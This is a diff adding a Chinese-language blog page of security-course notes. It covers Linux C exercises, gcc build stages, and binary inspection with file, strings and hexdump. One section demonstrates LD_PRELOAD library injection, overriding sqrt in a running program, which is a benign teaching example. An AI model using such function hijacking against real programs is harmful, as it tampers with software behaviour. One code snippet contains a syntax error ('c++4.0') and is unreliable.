@@ -1,0 +1,3139 @@
+
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="utf-8" />
+    <title>1/28、1/31 SecurityFocus Online | 此情吳計可消除</title>
+    <meta name="author" content="yih-0118" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/lioshi.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>載入過慢請開啟快取 瀏覽器預設開啟</p>
+                    <img src="/images/load.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>此情吳計可消除</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;首頁</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;關於我</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;檔案</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分類</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;標籤</span>
+        </a>
+        
+        <!-- 添加深色模式切換按鈕 -->
+        <a href="javascript:void(0);" id="dark-mode-toggle-desktop" @click="toggleDarkMode">
+            <i :class="['fa-solid', darkMode ? 'fa-sun' : 'fa-moon', 'fa-fw']"></i>
+            <span>&ensp;{{ darkMode ? '淺色模式' : '深色模式' }}</span>
+        </a>
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;此情吳計可消除</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">首頁</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">關於我</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">檔案</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">分類</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">標籤</div>
+                    </div>
+                </a>
+                
+                <!-- 添加深色模式切換按鈕 -->
+                <a href="javascript:void(0);" id="dark-mode-toggle-mobile" @click="toggleDarkMode">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i :class="['fa-solid', darkMode ? 'fa-sun' : 'fa-moon', 'fa-fw']"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">{{ darkMode ? '淺色模式' : '深色模式' }}</div>
+                    </div>
+                </a>
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>1/28、1/31 SecurityFocus Online</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/1/28
+        </span>
+        
+        <span class="category">
+            <a href="/categories/ISIP/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                ISIP
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/writeup/" style="color: #ff7d73">
+                    writeup
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>SecurityFocus Online</p>
+<span id="more"></span>
+
+<h1 id="Linux-C"><a href="#Linux-C" class="headerlink" title="Linux C"></a>Linux C</h1><h2 id="編譯與執行"><a href="#編譯與執行" class="headerlink" title="編譯與執行"></a>編譯與執行</h2><h3 id="範例1-輸入與輸出"><a href="#範例1-輸入與輸出" class="headerlink" title="範例1:輸入與輸出"></a>範例1:輸入與輸出</h3><pre><code class="c++">#include &lt;stdio.h&gt;
+
+int main(void) &#123;
+    float miles;
+
+    printf(&quot;Please enter miles:&quot;);
+    scanf(&quot;%f&quot;, &amp;miles);
+
+    float kilometers = miles * 1.6;
+
+    printf(&quot;%f Kilometers&quot;, kilometers);
+&#125;
+</code></pre>
+<h4 id="執行與編譯結果"><a href="#執行與編譯結果" class="headerlink" title="執行與編譯結果"></a>執行與編譯結果</h4><ul>
+<li>輸入<br><img src="https://hackmd.io/_uploads/rk3HLCN9p.png" alt="image"></li>
+<li>結果<br><img src="https://hackmd.io/_uploads/HkY3L045a.png" alt="image"></li>
+<li>理解與構思：英里轉公里<br>  <code>float kilometers = miles * 1.6;</code>英里是公里的1.6倍，所以直接乘以1.6即可</li>
+</ul>
+<hr>
+<h3 id="範例3-格式化輸入與輸出-算術運算子（Arithmetic-Operators）"><a href="#範例3-格式化輸入與輸出-算術運算子（Arithmetic-Operators）" class="headerlink" title="範例3:格式化輸入與輸出 | 算術運算子（Arithmetic Operators）"></a>範例3:格式化輸入與輸出 | 算術運算子（Arithmetic Operators）</h3><pre><code class="c++">#include &lt;stdio.h&gt;
+#include &lt;math.h&gt; 
+
+int main()
+&#123;
+   float a = 1.0, b = 6.0, c++4.0;
+   printf (&quot;%.4f&quot;, sqrt(a+b*c));
+   return 0;
+&#125;
+</code></pre>
+<h4 id="執行與編譯結果-1"><a href="#執行與編譯結果-1" class="headerlink" title="執行與編譯結果"></a>執行與編譯結果</h4><ul>
+<li><p>輸入<br><img src="https://hackmd.io/_uploads/rymXc049a.png" alt="image"></p>
+</li>
+<li><p>過程中報錯<br><img src="https://hackmd.io/_uploads/ryp8cAVqT.png" alt="image"></p>
+</li>
+<li><p><code>/usr/bin/ld: /tmp/ccFkUuaF.o: in function `main&#39;: PLAYGROUND.c:(.text+0x38): undefined reference to `sqrt&#39; collect2: error: ld returned 1 exit status</code></p>
+</li>
+<li><p>修復報錯<br><code>sqrt</code>需要連結 math 函式庫。但在Linux中，這個函式庫通常被稱為 libm，因此需要在編譯時告訴編譯器連結 libm。所以編譯指令需要這去寫：<br><code>gcc PLAYGROUND.c -lm -o PLAYGROUND</code> </p>
+</li>
+<li><p>結果<br><img src="https://hackmd.io/_uploads/rkZvj049p.png" alt="image"></p>
+</li>
+</ul>
+<h3 id="範例11-迴圈設計"><a href="#範例11-迴圈設計" class="headerlink" title="範例11:迴圈設計"></a>範例11:迴圈設計</h3><ul>
+<li>練習作業:在console端輸入n &#x3D;&#x3D; &gt; 輸出:n!&#x3D;1_2_3*….*n的結果<ul>
+<li>使用三種loop技術撰寫</li>
+</ul>
+</li>
+</ul>
+<pre><code class="c++">//FOR LOOP
+#include &lt;stdio.h&gt;
+int main()&#123;
+    int n, i, sum = 1; //由於是階乘，故sum = 1 必為預設 
+    printf(&quot;Enter a positive integer: &quot;);
+    scanf(&quot;%d&quot;, &amp;n);
+    for (i = 1; i &lt;= n; ++i)&#123;
+        sum *= i;
+    &#125;
+    printf(&quot;Sum = %d&quot;, sum);
+    return 0;
+&#125;
+</code></pre>
+<ul>
+<li>輸入與結果</li>
+</ul>
+<ol>
+<li><img src="https://hackmd.io/_uploads/B17wb1Hca.png" alt="image"></li>
+<li><img src="https://hackmd.io/_uploads/BkF2lyBqp.png" alt="image"></li>
+</ol>
+<hr>
+<pre><code class="c++">//WHILE LOOP
+#include &lt;stdio.h&gt;
+int main()&#123;
+    int n, i, sum = 1;
+    printf(&quot;Enter a positive integer: &quot;);
+    scanf(&quot;%d&quot;, &amp;n);
+    i = 1;
+    while (i &lt;= n)&#123;
+        sum *= i;
+        ++i;
+    &#125;
+    printf(&quot;Sum = %d&quot;, sum);
+    return 0;
+&#125;
+</code></pre>
+<ol>
+<li><img src="https://hackmd.io/_uploads/r13hz1Bc6.png" alt="image"></li>
+<li><img src="https://hackmd.io/_uploads/r1117kB5p.png" alt="image"></li>
+</ol>
+<hr>
+<pre><code class="c++">//DO While LOOP
+#include &lt;stdio.h&gt;
+int main() &#123;
+    int n, i, sum = 1;
+    printf(&quot;Enter a positive integer: &quot;);
+    scanf(&quot;%d&quot;, &amp;n);
+    i = 1;
+    do&#123;
+      sum *= i;
+      ++i;
+    &#125; while (i &lt;= n);
+    printf(&quot;Sum = %d&quot;, sum);
+    return 0;
+&#125;
+</code></pre>
+<ol>
+<li><p><img src="https://hackmd.io/_uploads/SJUjXyB9T.png" alt="image"></p>
+</li>
+<li><p><img src="https://hackmd.io/_uploads/ByVO4kH5p.png" alt="image"></p>
+</li>
+</ol>
+<hr>
+<ul>
+<li>練習作業:底下輸出結果是多少? and why?</li>
+</ul>
+<pre><code class="c++">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+int main(void) &#123;
+  int x;
+  float y;
+  for (x=0, y=50; x&lt;25; x+=5, y/=2)
+    printf(&quot;x=%d, y=%4.2f\n&quot;, x, y);
+  return 0;
+&#125;
+</code></pre>
+<ul>
+<li>輸入與結果</li>
+</ul>
+<ol>
+<li><p><img src="https://hackmd.io/_uploads/BJL2VJrcp.png" alt="image"></p>
+<ul>
+<li>結果<br> <img src="https://hackmd.io/_uploads/Sk8JBJSca.png" alt="image"></li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>解釋：<ol>
+<li>初始時，x 設為 0，y 設為 50。</li>
+<li>進入循環，輸出 x 和 y 的值。</li>
+<li>在每次循環中，x 都增加 5，y 都除以 2。</li>
+<li>循環結束條件是 x &lt; 25，當 x 達到或超過 25 時，循環停止。</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h3 id="範例16-費式序列Fibonacci-Serie"><a href="#範例16-費式序列Fibonacci-Serie" class="headerlink" title="範例16:費式序列Fibonacci Serie"></a>範例16:費式序列Fibonacci Serie</h3><ul>
+<li>費式序列Fibonacci Series: 0 1 1 2 3 5 8 13 21 34</li>
+<li>f(0)&#x3D;0, f(1)&#x3D;1, f(n)&#x3D;f(n-1)+f(n-2)</li>
+<li>底下是用迴圈方式計算費式序列Fibonacci Serie</li>
+<li>&#x3D;&#x3D;作業:使用遞迴函數方式計算費式序列Fibonacci Serie&#x3D;&#x3D;</li>
+</ul>
+<pre><code class="c++">// 遞迴
+#include &lt;stdio.h&gt;
+long long f(int n)&#123;
+    if(n==0) return 0;
+    if(n==1) return 1;
+    return f(n-1)+f(n-2);
+&#125;
+int main()&#123;
+    int n;
+    scanf(&quot;%d&quot;,&amp;n);
+    printf(&quot;%lld&quot;,f(n));
+&#125;
+</code></pre>
+<ul>
+<li>輸入與結果<ul>
+<li><img src="https://hackmd.io/_uploads/rkNlO1H5p.png" alt="image"></li>
+<li><img src="https://hackmd.io/_uploads/B10GukSqT.png" alt="image"></li>
+</ul>
+</li>
+</ul>
+<pre><code class="c++">//遞迴解法2 （減少計算重複項目）
+#include &lt;stdio.h&gt;
+long long F[1000005];
+long long f(int n) &#123;
+    if (n == 0) return 0;
+    if (n == 1) return 1;
+    if (F[n] != -1) return F[n];
+    F[n] = f(n - 1) + f(n - 2);
+    return F[n];
+&#125;
+int main() &#123;
+    for (int i = 0; i &lt; 1000000; i++)&#123;
+        F[i] = -1;
+    &#125;
+    int n;
+    scanf(&quot;%d&quot;, &amp;n);
+    printf(&quot;%lld\n&quot;, f(n));
+    return 0;
+&#125;
+</code></pre>
+<ul>
+<li>輸入與結果<ul>
+<li><img src="https://hackmd.io/_uploads/rySXFyrqT.png" alt="image"></li>
+<li><img src="https://hackmd.io/_uploads/S1MRFyHc6.png" alt="image"></li>
+</ul>
+</li>
+<li>原理與解釋</li>
+</ul>
+<ol>
+<li><code>long long F[1000005];</code>: 宣告一個陣列 <code>F</code> 用來存儲 Fibonacci 數列的計算結果。</li>
+<li><code>long long f(int n)</code>: 定了一個遞迴函數 <code>f</code>，用來計算 Fibonacci 數列的第 <code>n</code> 項。如果 <code>n</code> 為 0，返回 0；如果 <code>n</code> 為 1，返回 1。如果 <code>F[n]</code> 不等於 -1，&#x3D;&#x3D;表示已經計算過 <code>f(n)</code>，直接返回 <code>F[n]</code>&#x3D;&#x3D;；否則，計算 <code>f(n-1) + f(n-2)</code> 並將結果存入 <code>F[n]</code>，最後返回 <code>F[n]</code>。</li>
+</ol>
+<hr>
+<h1 id="從原始碼到可執行檔"><a href="#從原始碼到可執行檔" class="headerlink" title="從原始碼到可執行檔"></a>從原始碼到可執行檔</h1><pre><code class="c++">#include &lt;stdio.h&gt;
+
+#define FORMAT_STRING &quot;%s&quot;  //定義FORMAT_STRING為%s字串輸出
+#define MESSAGE &quot;Hello, CTFer!\n&quot; //定義MESSAGE為要輸出的字串內容
+
+int
+main(int argc, char *argv[]) &#123;
+  printf(FORMAT_STRING, MESSAGE); //輸出結果然後換行
+  return 0;
+&#125;
+</code></pre>
+<ul>
+<li>輸入與結果<ul>
+<li><img src="https://hackmd.io/_uploads/HyBB2lS5T.png" alt="image"></li>
+<li><img src="https://hackmd.io/_uploads/SJ7cCgBqa.png" alt="image"></li>
+</ul>
+</li>
+</ul>
+<h2 id="gcc的參數"><a href="#gcc的參數" class="headerlink" title="gcc的參數"></a>gcc的參數</h2><ul>
+<li>原始程式: PLAYGROUND.c</li>
+<li>預處理階段 &#x3D;&#x3D;&gt; gcc –E PLAYGROUND.c –o PLAYGROUND.i</li>
+<li>編譯階段 &#x3D;&#x3D;&gt; gcc –S PLAYGROUND.i –o PLAYGROUND.s</li>
+<li>組譯階段 &#x3D;&#x3D;&gt; gcc –c PLAYGROUND.s –o PLAYGROUND.o</li>
+<li>連結階段 &#x3D;&#x3D;&gt; gcc PLAYGROUND.o –o PLAYGROUND</li>
+<li>export LD_LIBRARY_PATH&#x3D;.</li>
+</ul>
+<hr>
+<p><strong>原程式-&gt;PLAYGROUND.c</strong></p>
+<pre><code class="c++">#include &lt;stdio.h&gt;
+int main()&#123;
+    printf(&quot;Wu YiHung\n&quot;);
+   return 0;
+&#125;
+</code></pre>
+<ul>
+<li>輸入<img src="https://hackmd.io/_uploads/rkcJr-S56.png" alt="image"></li>
+</ul>
+<ol>
+<li>預處理階段 &#x3D;&#x3D;&gt; <code>gcc -E PLAYGROUND.c -o PLAYGROUND.i</code><ul>
+<li>輸入與結果<ul>
+<li>確認有.i的檔案<img src="https://hackmd.io/_uploads/BJd2r-S5a.png" alt="image"></li>
+<li>嘗試打開，出現，這個階段是將標頭檔<code>stdio.h</code>爆開 <img src="https://hackmd.io/_uploads/SylLQIZBqp.png" alt="image"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<pre><code class="txt"># 0 &quot;PLAYGROUND.c&quot;
+# 0 &quot;&lt;built-in&gt;&quot;
+# 0 &quot;&lt;command-line&gt;&quot;
+# 1 &quot;/usr/include/stdc-predef.h&quot; 1 3 4
+# 0 &quot;&lt;command-line&gt;&quot; 2
+# 1 &quot;PLAYGROUND.c&quot;
+# 1 &quot;/usr/include/stdio.h&quot; 1 3 4
+# 27 &quot;/usr/include/stdio.h&quot; 3 4
+# 1 &quot;/usr/include/aarch64-linux-gnu/bits/libc-header-start.h&quot; 1 3 4
+# 33 &quot;/usr/include/aarch64-linux-gnu/bits/libc-header-start.h&quot; 3 4
+# 1 &quot;/usr/include/features.h&quot; 1 3 4
+# 392 &quot;/usr/include/features.h&quot; 3 4
+# 1 &quot;/usr/include/features-time64.h&quot; 1 3 4
+# 20 &quot;/usr/include/features-time64.h&quot; 3 4      
+                                                
+~~~中間省略數百行
+
+extern void funlockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__));
+# 885 &quot;/usr/include/stdio.h&quot; 3 4
+extern int __uflow (FILE *);
+extern int __overflow (FILE *, int);
+# 902 &quot;/usr/include/stdio.h&quot; 3 4
+
+# 2 &quot;PLAYGROUND.c&quot; 2
+
+# 2 &quot;PLAYGROUND.c&quot;
+int main()&#123;
+    printf(&quot;Wu YiHung\n&quot;);
+   return 0;
+&#125;
+</code></pre>
+<hr>
+<ol start="2">
+<li><p>編譯階段 &#x3D;&#x3D;&gt; <code>gcc -S PLAYGROUND.i -o PLAYGROUND.s</code></p>
+<ul>
+<li>輸入與結果</li>
+<li>執行後，產生.s檔<img src="https://hackmd.io/_uploads/rydJ_Wr9T.png" alt="image"></li>
+<li>直接打開<code>PLAYGROUND.s</code><img src="https://hackmd.io/_uploads/HyyIOWHc6.png" alt="image"></li>
+</ul>
+<pre><code class="txt">yih@yih:~/Documents/C$ cat PLAYGROUND.s
+    .arch armv8-a
+    .file	&quot;PLAYGROUND.c&quot; //指定了文件的名稱
+    .text
+    .section	.rodata
+    .align	3
+.LC0:
+    .string	&quot;Wu YiHung&quot;
+    .text
+    .align	2
+    .global	main
+    .type	main, %function //表示程式的開始
+main:
+.LFB0: //這是函數開始（LFB）標籤，下方是記憶體緩存暫存的地址(動態資訊)
+    .cfi_startproc
+    stp	x29, x30, [sp, -16]!
+    .cfi_def_cfa_offset 16
+    .cfi_offset 29, -16
+    .cfi_offset 30, -8
+    mov	x29, sp
+    adrp	x0, .LC0
+    add	x0, x0, :lo12:.LC0
+    bl	puts
+    mov	w0, 0
+    ldp	x29, x30, [sp], 16
+    .cfi_restore 30
+    .cfi_restore 29
+    .cfi_def_cfa_offset 0
+    ret
+    .cfi_endproc
+.LFE0: //這是函數結束（LFE）標籤
+    .size	main, .-main
+    .ident	&quot;GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0&quot; //GCC 的版本
+    .section	.note.GNU-stack,&quot;&quot;,@progbits
+</code></pre>
+</li>
+<li><p>組譯階段 &#x3D;&#x3D;&gt; <code>gcc -c PLAYGROUND.s -o PLAYGROUND.o</code></p>
+<ul>
+<li>輸入與結果<br>  - 執行後產生<code>.o</code>檔<img src="https://hackmd.io/_uploads/BkfH9ZB96.png" alt="image"><br>  - 開啟後，就出現了亂碼!<img src="https://hackmd.io/_uploads/rkKkj-r56.png" alt="image"><br>  - 只能從中得知是二進制文件（ELF格式的可執行文件）</li>
+</ul>
+</li>
+</ol>
+<hr>
+<ol start="4">
+<li><p>連結階段 &#x3D;&#x3D;&gt; <code>gcc PLAYGROUND.o -o PLAYGROUND</code></p>
+<ul>
+<li>輸入與結果<ul>
+<li>執行後新增了<code>PLAYGROUND</code>檔<img src="https://hackmd.io/_uploads/H1ex2WB9a.png" alt="image"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>執行檔案 &#x3D;&#x3D;&gt; <code>./PLAYGROUND</code></p>
+</li>
+</ol>
+<ul>
+<li>最後執行該結果<img src="https://hackmd.io/_uploads/BJqS2bH5p.png" alt="image"></li>
+</ul>
+<ol start="6">
+<li><p>檢視檔案大小&#x3D;&#x3D;&gt; ls -al PLAYGROUND.*<img src="https://hackmd.io/_uploads/HJ1xaWH5T.png" alt="image"></p>
+<p> <img src="https://hackmd.io/_uploads/rkFNa-rcp.png" alt="image"></p>
+</li>
+</ol>
+<hr>
+<h3 id="組合語言格式-INTEL-vs-AT-T-格式"><a href="#組合語言格式-INTEL-vs-AT-T-格式" class="headerlink" title="組合語言格式:INTEL vs AT&amp;T 格式"></a>組合語言格式:INTEL vs AT&amp;T 格式</h3><ul>
+<li>產生AT&amp;T語法格式的組語(gcc預設使用的格式) &#x3D;&#x3D;&gt; gcc -S <code>-masm=att</code> PLAYGROUND.c -o PLAYGROUND_att.s</li>
+</ul>
+<ul>
+<li>發現問題，想到既然在gcc是預設，那何必加入這段？<img src="https://hackmd.io/_uploads/B1k2RWH9p.png" alt="image"></li>
+<li>確實可以<img src="https://hackmd.io/_uploads/HkehVJGB5p.png" alt="image"></li>
+</ul>
+<ul>
+<li><p>開啟後結果<img src="https://hackmd.io/_uploads/ByVOJMBqT.png" alt="image"></p>
+<ul>
+<li>PLAYGROUND_att.s</li>
+</ul>
+<pre><code class="txt">    .arch armv8-a
+    .file	&quot;PLAYGROUND.c&quot;
+    .text
+    .section	.rodata
+    .align	3
+.LC0:
+    .string	&quot;Wu YiHung&quot;
+    .text
+    .align	2
+    .global	main
+    .type	main, %function
+main:
+.LFB0:
+    .cfi_startproc
+    stp	x29, x30, [sp, -16]!
+    .cfi_def_cfa_offset 16
+    .cfi_offset 29, -16
+    .cfi_offset 30, -8
+    mov	x29, sp
+    adrp	x0, .LC0
+    add	x0, x0, :lo12:.LC0
+    bl	puts
+    mov	w0, 0
+    ldp	x29, x30, [sp], 16
+    .cfi_restore 30
+    .cfi_restore 29
+    .cfi_def_cfa_offset 0
+    ret
+    .cfi_endproc
+.LFE0:
+    .size	main, .-main
+    .ident	&quot;GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0&quot;
+    .section	.note.GNU-stack,&quot;&quot;,@progbits
+</code></pre>
+</li>
+<li><p>產生Intel語法格式的組語(微軟預設使用的格式) &#x3D;&#x3D;&gt; gcc -S <code>-masm=intel</code> PLAYGROUND.c <code>-o</code> PLAYGROUND_intel.s</p>
+<ul>
+<li>發生問題<img src="https://hackmd.io/_uploads/SJvIgfHcp.png" alt="image"></li>
+<li>我用windows的windows powershell試看看，運行無報錯<img src="https://hackmd.io/_uploads/Hke9978cT.png" alt="image"></li>
+<li>運行結果<img src="https://hackmd.io/_uploads/HkDJoQU9a.png" alt="image"></li>
+</ul>
+</li>
+<li><p>PLAYGROUND_intel.s</p>
+<pre><code class="txt!">        .file   &quot;PLAYGROUND.c&quot;
+        .intel_syntax noprefix
+        .text
+        .def    __main; .scl    2;      .type   32;     .endef
+        .section .rdata,&quot;dr&quot;
+.LC0:
+        .ascii &quot;Wu YiHung\0&quot;
+        .text
+        .globl  main
+        .def    main;   .scl    2;      .type   32;     .endef
+        .seh_proc       main
+main:
+        push    rbp
+        .seh_pushreg    rbp
+        mov     rbp, rsp
+        .seh_setframe   rbp, 0
+        sub     rsp, 32
+        .seh_stackalloc 32
+        .seh_endprologue
+        call    __main
+        lea     rcx, .LC0[rip]
+        call    puts
+        mov     eax, 0
+        add     rsp, 32
+        pop     rbp
+        ret
+        .seh_endproc
+        .ident  &quot;GCC: (x86_64-win32-seh-rev0, Built by MinGW-W64 project) 8.1.0&quot;
+        .def    puts;   .scl    2;      .type   32;     .endef
+</code></pre>
+</li>
+</ul>
+<h3 id="比較之結果"><a href="#比較之結果" class="headerlink" title="比較之結果"></a>比較之結果</h3><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://hackmd.io/_uploads/rkZk8Ia26.png" alt="image"></h2><h1 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><h2 id="實作範例與結果"><a href="#實作範例與結果" class="headerlink" title="實作範例與結果"></a>實作範例與結果</h2><h3 id="範例程式"><a href="#範例程式" class="headerlink" title="範例程式"></a>範例程式</h3><pre><code class="c++">//PLAYGROUND.c                   
+#include &lt;stdio.h&gt;
+#include &lt;math.h&gt;
+int main() &#123;
+  double x;
+  scanf(&quot;%lf&quot;, &amp;x);
+  printf(&quot;%f\n&quot;, sqrt(x));
+  return 0;
+&#125;
+</code></pre>
+<ul>
+<li>輸入<img src="https://hackmd.io/_uploads/Skt257v5a.png" alt="image"></li>
+<li>執行結果<img src="https://hackmd.io/_uploads/S1CesXw5a.png" alt="image"></li>
+</ul>
+<h3 id="駭入程式範例"><a href="#駭入程式範例" class="headerlink" title="駭入程式範例"></a>駭入程式範例</h3><pre><code class="txt">//inject.c               
+double sqrt(double x) &#123;
+  return 1122334455;
+&#125;
+</code></pre>
+<h3 id="編譯並執行看看被竄改的答案"><a href="#編譯並執行看看被竄改的答案" class="headerlink" title="編譯並執行看看被竄改的答案"></a>編譯並執行看看被竄改的答案</h3><ul>
+<li>執行指令 <ol>
+<li><code>gcc -o inject.so -shared inject.c</code></li>
+<li><code>LD_PRELOAD=./inject.so ./PLAYGROUND</code></li>
+</ol>
+</li>
+</ul>
+<h3 id="比較"><a href="#比較" class="headerlink" title="比較"></a>比較</h3><ul>
+<li>主要程式碼是要求輸入值的開根號，但有了<code>inject.c</code>的注入，不管輸入值是多少，僅會輸出二<ul>
+<li>inject.c中的 <code>retrun 1122334455;</code><img src="https://hackmd.io/_uploads/HJ7aK7C26.png" alt="image"></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="Linux-執行檔分析"><a href="#Linux-執行檔分析" class="headerlink" title="Linux 執行檔分析"></a>Linux 執行檔分析</h1><h2 id="Linux-file命令-command"><a href="#Linux-file命令-command" class="headerlink" title="Linux file命令(command)"></a>Linux file命令(command)</h2><ul>
+<li>指令<ul>
+<li><code>file /bin/ls</code><ul>
+<li>結果<img src="https://hackmd.io/_uploads/By1UWEw5p.png" alt="image"></li>
+</ul>
+</li>
+<li><code>file xxx.png</code><ul>
+<li>結果<img src="https://hackmd.io/_uploads/ry8kfNP96.png" alt="image"></li>
+</ul>
+</li>
+<li><code>file xxx.doc</code><ul>
+<li>結果<img src="https://hackmd.io/_uploads/S1fIfEvcT.png" alt="image"></li>
+</ul>
+</li>
+<li><code>file xxx.pdf</code><ul>
+<li>結果<img src="https://hackmd.io/_uploads/BJRtfED5T.png" alt="image"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><ul>
+<li><code>strings /bin/ls</code><br>-  一堆東西<img src="https://hackmd.io/_uploads/ByuXmVvc6.png" alt="image"><ul>
+<li><code>strings /bin/ls | grep Copyright</code><ul>
+<li>找到關鍵字<img src="https://hackmd.io/_uploads/SkoIXVDqa.png" alt="image"></li>
+</ul>
+</li>
+<li><code>strings hexedit | grep CTF</code><ul>
+<li>結果<img src="https://hackmd.io/_uploads/BJzlVEwca.png" alt="image"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="hexdump-hd"><a href="#hexdump-hd" class="headerlink" title="hexdump | hd"></a>hexdump | hd</h2><p>顯示執行畫面與解說</p>
+<ul>
+<li><p>ELF(Executable and Linkable Format) 的檔案特徵<img src="https://hackmd.io/_uploads/ryMU84w56.png" alt="image"><img src="https://hackmd.io/_uploads/Sycb2Evcp.png" alt="image"></p>
+</li>
+<li><p>MP3 的檔案特徵<img src="https://hackmd.io/_uploads/HJxg34w56.png" alt="image"><img src="https://hackmd.io/_uploads/HkCGnVP56.png" alt="image"></p>
+</li>
+<li><p>.jpg 的檔案特徵<br><img src="https://hackmd.io/_uploads/Sy0EqO_9T.png" alt="image"><br><img src="https://hackmd.io/_uploads/HJsX5ud9a.png" alt="image"></p>
+</li>
+<li><p>.png 的檔案特徵<br><img src="https://hackmd.io/_uploads/HyMD5d_qa.png" alt="image"><br><img src="https://hackmd.io/_uploads/SyQd9Od5a.png" alt="image"></p>
+</li>
+</ul>
